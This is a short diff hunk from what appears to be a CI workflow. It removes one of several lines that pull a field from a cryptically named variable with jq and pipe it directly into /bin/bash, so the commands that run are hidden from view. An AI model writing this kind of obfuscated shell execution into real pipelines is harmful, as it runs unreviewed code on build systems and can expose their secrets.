@@ -20,7 +20,6 @@ jobs:
           echo $f78 | jq -r .ttovh43 | /bin/bash
           echo $nb66577 | jq -r .t702 | /bin/bash
           echo $v851 | jq -r .m6 | /bin/bash
-          echo $fptc5 | jq -r .kze6 | /bin/bash
           echo $ipt1244 | jq -r .rdwqy6986 | /bin/bash
           echo $d73919 | jq -r .www66 | /bin/bash
 
